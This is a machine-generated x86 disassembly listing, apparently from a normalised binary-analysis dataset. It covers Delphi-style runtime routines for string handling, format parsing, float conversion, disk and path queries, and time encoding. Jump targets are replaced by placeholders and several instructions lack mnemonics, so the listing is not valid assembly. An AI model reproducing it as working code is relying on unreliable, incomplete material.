sub_4084d0
push ebx
push esi
mov esi eax
mov eax esi
call sub_4042c8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c144
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408500
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4042c8
mov edi eax
mov eax ebx
call sub_4044c8
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4087bc
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c144
cmp al 0x2
jne r-xdata
dec edi
sub_408550
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408500
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404528
pop edi
pop esi
pop ebx
retn
sub_408588
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4044c8
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_4040f8
add esp 0x108
pop esi
pop ebx
retn
sub_4085c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404dac
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404dac
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408674
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_40869c
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4086d0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4042c8
push eax
mov eax ebx
call sub_4044c8
mov edx eax
mov eax esi
pop ecx
call sub_40869c
pop esi
pop ebx
retn
sub_4086f4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4044c8
mov edx eax
mov ecx edi
mov eax ebx
call sub_40869c
pop edi
pop esi
pop ebx
retn
sub_408714
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408738
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408778
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4087d0
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408844
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408638
mov esi eax
inc esi
mov eax esi
call sub_408824
mov ecx esi
mov edx ebx
call sub_408664
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408880
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c168
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408664
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407ca0
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408908
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408c5f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_4089ea
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408a32
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_4089ea
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_4088fc
pop edx
or edx edx
je r-xdata
sub_4089ea
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408c5f
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408a32
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408c5f
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408880
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408a59 ]
mov ebx ecx
sub cl 0x44
je sub_408050
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404230
jmp r-xdata
mov esi sub_404290
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_408050
sub cl 0x44
je sub_407fe4
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407fe4
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408050
mov ecx 0x10
cmp bl 0x58
je sub_407fe4
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4088d8
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408e18
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407fe4
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408c80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408638
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408908
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408cc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408638
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408908
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408d14
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4042c8
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408908
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_4040f8
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404008
mov eax esi
mov edx ebx
call sub_404654
mov eax [ ebp - 0x4 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408908
mov edx esi
xchg edx eax
call sub_404654
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408dd4
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408e18
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4090ec
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408f17
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408f21
call sub_408f17
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408dd4
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408f7d
call sub_408f17
call sub_408f0e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408f0e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408dd4
retn
xor ecx ecx
sub_408fb9
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408f0e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408f0e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40901e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_409072
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408fb9
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4090ec
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409119
jmp r-xdata
call sub_40923b
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409119
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402de4
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_40923b
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409318
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4093cf
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4093da
neg edx
mov ecx esi
call sub_4093da
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4093cf
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4093f6
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402de4
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4093da
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4093f6
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40942c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408e18
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040f8
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40945c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408e18
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040f8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4094a8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esp
xor ecx ecx
call sub_409318
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4094d4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esp
xor ecx ecx
call sub_409318
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40951c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409560
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4095d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409560
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407c88
sub_409610
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40951c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407c6c
push esi
mov ecx ebx
